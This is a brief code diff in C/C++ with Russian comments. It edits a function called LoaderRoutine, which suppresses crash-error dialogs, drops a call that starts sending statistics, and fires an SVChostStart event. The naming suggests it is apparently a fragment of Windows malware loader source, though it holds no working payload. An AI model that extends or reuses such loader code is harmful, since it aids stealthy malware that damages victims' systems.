@@ -111,9 +111,6 @@ DWORD WINAPI LoaderRoutine( LPVOID lpData )
 	// Отключаем отображение ошибок при крахе процесса
 	DisableShowFatalErrorDialog();
 
-	// Инициализируем отсылку статистики
-	DebugReportInit();
-
 	// Вызываем событие
 	bool Cancel = false;
 	SVChostStart(NULL, Cancel);
